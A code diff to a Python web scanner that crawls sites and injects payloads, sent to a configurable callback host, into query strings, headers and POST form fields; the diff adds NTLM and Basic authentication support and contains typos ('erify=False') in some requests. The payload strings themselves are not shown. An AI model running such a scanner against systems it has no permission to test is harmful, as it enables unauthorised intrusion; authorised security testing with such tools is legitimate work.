@@ -1,6 +1,8 @@
 import argparse, base64, random, requests, string, sys, time, urllib3
 from bs4 import BeautifulSoup
 from datetime import datetime
+from requests.auth import HTTPBasicAuth
+from requests_ntlm import HttpNtlmAuth
 from termcolor import cprint
 from urllib.parse import urljoin
 
@@ -81,21 +83,25 @@ def show_banner(_url, _auth, _evil_site, _evil_port, _callback, _crawl, _method,
 
 
 ###
-def crawler_get_url(url, creds, queue, chaos):
+def crawler_get_url(url, code, auth_type, creds, queue, chaos):
   headers = {}
   headers.update({'User-agent': HEADER_UA[chaos]})
-  if creds != 'no':
-    headers.update({'Authorization': 'Basic ' + creds})
-  html = requests.get(url, headers=headers, verify=False, timeout=TIMEOUT).text
+  if code == 401:
+    if auth_type == 'NTLM':
+      response = requests.get(url, auth=HttpNtlmAuth(creds[0], creds[1]), headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+    elif auth_type == 'Basic':
+      response = requests.get(url, auth=HTTPBasicAuth(creds[0], creds[1]), headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+  else:
+    response = requests.get(url, headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
 
-  soup = BeautifulSoup(html, 'html.parser')
+  soup = BeautifulSoup(response.content, 'html.parser')
   for link in soup.find_all('a'):
     path = link.get('href')
     if path is not None:
       if path and path.startswith('/'):
         path = urljoin(url, path)
       crawler_add2queue(path, url, queue)
-  
+
 
 ###
 def crawler_add2queue(path, url, queue):
@@ -105,19 +111,7 @@ def crawler_add2queue(path, url, queue):
 
 
 ###
-def handle_401(url, _auth):
-  cprint('[!] Using given credentials', 'cyan')
-  with open(_auth, 'r') as fp:
-    creds = fp.readline()
-    creds = creds.strip()
-    creds = creds.encode('ascii')
-    creds64_b = base64.b64encode(creds)
-    creds64_m = creds64_b.decode('ascii')
-  return creds64_m
-
-
-###
-def scanner(_url, creds, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload, chaos):
+def scanner(_url, code, auth_type, creds, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload, chaos):
   payloads = get_payloads(_payload, _evil_site, _evil_port, _callback)
   max_payloads = len(payloads)
   cpt_payloads = 1
@@ -126,9 +120,13 @@ def scanner(_url, creds, _evil_site, _evil_port, _callback, _method, _param, _he
     try:
       headers2 = {}
       headers2.update({'User-agent': HEADER_UA[chaos]})
-      if creds != 'no':
-        headers2.update({'Authorization': 'Basic ' + creds})
-      response = requests.get(url=_url, headers=headers2, verify=False, allow_redirects=True, timeout=TIMEOUT)
+      if code == 401:
+        if auth_type == 'NTLM':
+          response = requests.get(url=_url, auth=HttpNtlmAuth(creds[0], creds[1]), headers=headers2, verify=False, allow_redirects=True, timeout=TIMEOUT)
+        elif auth_type == 'Basic':
+          response = requests.get(url=_url, auth=HTTPBasicAuth(creds[0], creds[1]), headers=headers2, verify=False, allow_redirects=True, timeout=TIMEOUT)
+      else:
+        response = requests.get(url=_url, headers=headers2, verify=False, allow_redirects=True, timeout=TIMEOUT)
       soup = BeautifulSoup(response.content, 'html.parser')
     except:
       print('ERRRRRRRRRRRRRRRRRRRRRROR')
@@ -138,17 +136,28 @@ def scanner(_url, creds, _evil_site, _evil_port, _callback, _method, _param, _he
     now = now.strftime("%d/%m/%Y %H:%M:%S")
 
     headers = get_headers(_header, payload, chaos)
-    if creds != 'no':
-      headers.update({'Authorization': 'Basic ' + creds})
-
     cprint(f'[!]   -> Current payload {cpt_payloads}/{max_payloads} ({now}): {payload}', 'cyan')
 
     # _method = get
     if _method == 'get' or _method == 'both':
+
       if _param == 'none':
-        requests.request(url=_url, method='GET', headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+        if code == 401:
+          if auth_type == 'NTLM':
+            response = requests.get(url, auth=HttpNtlmAuth(creds[0], creds[1]), headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+          elif auth_type == 'Basic':
+              response = requests.get(url, auth=HTTPBasicAuth(creds[0], creds[1]), headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+        else:
+          response = requests.get(url, headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+
       elif _param == 'classic':
-        requests.request(url=_url, method='GET', params={"q": payload}, headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+        if code == 401:
+          if auth_type == 'NTLM':
+            response = requests.get(url, auth=HttpNtlmAuth(creds[0], creds[1]), params={"q": payload}, headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+          elif auth_type == 'Basic':
+            response = requests.get(url, auth=HTTPBasicAuth(creds[0], creds[1]), params={"q": payload}, headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+        else:
+          response = requests.get(url, params={"q": payload}, headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
       time.sleep((WAIT_MIN + random.randint(1, WAIT_RAND_MAX)) / 1000000.0)
 
     # _method = post
@@ -157,13 +166,26 @@ def scanner(_url, creds, _evil_site, _evil_port, _callback, _method, _param, _he
         soup_inputs = soup.find_all('input')
         soup_action = soup.form['action']
         url = _url + soup_action
+
       except:
         cprint('[!]      Can\'t use POST method so using GET: did not find any form to post', 'magenta')
-        #headers = {}
         if _param == 'none':
-          requests.request(url=_url, method='GET', headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+          if code == 401:
+            if auth_type == 'NTLM':
+              response = requests.get(url=_url, auth=HttpNtlmAuth(creds[0], creds[1]), headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+            elif auth_type == 'Basic':
+              response = requests.get(url=_url, auth=HTTPBasicAuth(creds[0], creds[1]), headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+          else:
+            response = requests.get(url=_url, headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+
         elif _param == 'classic':
-          requests.request(url=_url, method='GET', params={"q": payload}, headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+          if code == 401:
+            if auth_type == 'NTLM':
+              response = requests.get(url=_url, auth=HttpNtlmAuth(creds[0], creds[1]), params={"q": payload}, headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+            elif auth_type == 'Basic':
+              response = requests.get(url=_url, auth=HTTPBasicAuth(creds[0], creds[1]), params={"q": payload}, headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+          else:
+            response = requests.get(url=_url, params={"q": payload}, headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
         time.sleep((WAIT_MIN + random.randint(1, WAIT_RAND_MAX)) / 1000000.0)
         continue
 
@@ -179,9 +201,22 @@ def scanner(_url, creds, _evil_site, _evil_port, _callback, _method, _param, _he
 
       try:
         if _param == 'none':
-          requests.request(url=url, method='POST', headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
+          if code == 401:
+            if auth_type == 'NTLM':
+              response = requests.post(url=url, auth=HttpNtlmAuth(creds[0], creds[1]), headers=headers, data=data, erify=False, allow_redirects=True, timeout=TIMEOUT)
+            elif auth_type == 'Basic':
+              response = requests.post(url=url, auth=HTTPBasicAuth(creds[0], creds[1]), headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
+          else:
+            response = requests.post(url=url, headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
+
         elif _param == 'classic':
-          requests.request(url=url, method='POST', params={'q': payload}, headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
+          if code == 401:
+            if auth_type == 'NTLM':
+              response = requests.post(url=url, auth=HttpNtlmAuth(creds[0], creds[1]), params={"q": payload}, headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
+            elif auth_type == 'Basic':
+              response = requests.post(url=url, auth=HTTPBasicAuth(creds[0], creds[1]), params={"q": payload}, headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
+          else:
+            response = requests.post(url=url, params={"q": payload}, headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
         time.sleep((WAIT_MIN + random.randint(1, WAIT_RAND_MAX)) / 1000000.0)
       except:
         cprint('[!] Potential vulnerability found: true positive or network blocking (check out in Active/Passive Callback Modules logs)', 'red', attrs=['bold'])
@@ -198,13 +233,26 @@ def scanner(_url, creds, _evil_site, _evil_port, _callback, _method, _param, _he
               data.update({val2: chaos})
           try:
             if _param == 'none':
-              requests.request(url=url, method='POST', headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
+              if code == 401:
+                if auth_type == 'NTLM':
+                  response = requests.post(url=url, auth=HttpNtlmAuth(creds[0], creds[1]), headers=headers, data=data, erify=False, allow_redirects=True, timeout=TIMEOUT)
+                elif auth_type == 'Basic':
+                  response = requests.post(url=url, auth=HTTPBasicAuth(creds[0], creds[1]), headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
+              else:
+                response = requests.post(url=url, headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
+
             elif _param == 'classic':
-              requests.request(url=url, method='POST', params={'r': payload}, headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
+              if code == 401:
+                if auth_type == 'NTLM':
+                  response = requests.post(url=url, auth=HttpNtlmAuth(creds[0], creds[1]), params={"q": payload}, headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
+                elif auth_type == 'Basic':
+                  response = requests.post(url=url, auth=HTTPBasicAuth(creds[0], creds[1]), params={"q": payload}, headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
+              else:
+                response = requests.post(url=url, params={"q": payload}, headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
             time.sleep((WAIT_MIN + random.randint(1, WAIT_RAND_MAX)) / 1000000.0)
           except:
             cprint('[!] Potential vulnerability found: true positive or network blocking (check out in Active/Passive Callback Modules logs)', 'red', attrs=['bold'])
-      
+
 
 ###
 def get_payloads(_payload, _evil_site, _evil_port, _callback):
@@ -252,7 +300,7 @@ def get_headers(header, payload, chaos):
   elif header == 'classic' or header == 'noua':
     for h in HEADER_CLASSIC:
       if 'User-agent' in h and header == 'noua':
-        headers.update({'User-agent': HEADER_UA[chaos]})        
+        headers.update({'User-agent': HEADER_UA[chaos]})
       else:
         value = HEADER_CLASSIC[h]
         value = value.replace('{{PAYLOAD}}', payload)
@@ -317,15 +365,25 @@ def main():
 
       cprint(f'[!] > Processing {main_url}', 'cyan', attrs=['bold'])
       cprint(f'[!] Received {response.status_code} HTTP Code', 'cyan')
-      
+
+      code = response.status_code
+      auth_type = ''
       creds = 'no'
       if _auth != 'no' and response.status_code == 401:
-        creds = handle_401(main_url, _auth)
+        code = 401
+        if 'NTLM' in response.headers['WWW-Authenticate']:
+          auth_type = 'NTLM'
+        elif 'Basic' in response.headers['WWW-Authenticate']:
+          auth_type = 'Basic'
+        cprint(f'[!] Got {auth_type} authentication', 'cyan')
+        with open(_auth, 'r') as fp:
+          creds = fp.readline()
+          creds = creds.strip()
+          creds = creds.split(':')
       elif _auth == 'no' and response.status_code == 401:
         cprint('[!] FATAL: can\'t go through 401 prompt', 'red', attrs=['bold'])
         print()
         continue
-
 
       if _crawl == 'yes' or _crawl == 'quick':
         if _crawl == 'quick':
@@ -340,13 +398,13 @@ def main():
               continue
             quick = quick + 1
           cprint('[!] Crawling ' + u, 'cyan')
-          crawler_get_url(u, creds, queue, chaos)
+          crawler_get_url(u, code, auth_type, creds, queue, chaos)
           cprint(f'[!] Scanning {u}', 'cyan')
-          scanner(u, creds, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload, chaos)
+          scanner(u, code, auth_type, creds, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload, chaos)
       else:
         cprint(f'[!] Not Crawling {main_url}', 'cyan')
         cprint(f'[!] Scanning {main_url}', 'cyan')
-        scanner(main_url, creds, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload, chaos)
+        scanner(main_url, code, auth_type, creds, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload, chaos)
       print()
 
 
@@ -354,6 +412,6 @@ def main():
     cprint("user interuption", 'red')
     raise SystemExit(0)
 
-### 
+###
 if __name__ == "__main__":
   main()
